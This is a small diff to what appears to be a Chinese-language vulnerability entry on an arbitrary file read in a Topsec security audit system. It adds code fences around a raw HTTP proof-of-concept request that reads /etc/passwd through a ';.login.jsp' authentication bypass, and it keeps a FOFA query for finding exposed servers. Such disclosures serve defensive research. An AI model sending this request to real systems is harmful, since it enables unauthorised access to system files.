@@ -79,6 +79,7 @@ FOFA：header="iam" && server="Apache-Coyote/"
 
 POC/EXP：
 
+```http
 POST /iam/download;.login.jsp HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
@@ -91,6 +92,7 @@ Sec-Fetch-Site: same-site
 Content-Length: 67
 
 filename=1.txt&filepath=/etc/passwd
+```
 
 ![image-20241101122253704](./.resource/天融信运维安全审计系统download任意文件读取漏洞/media/image-20241101122253704.png)
 
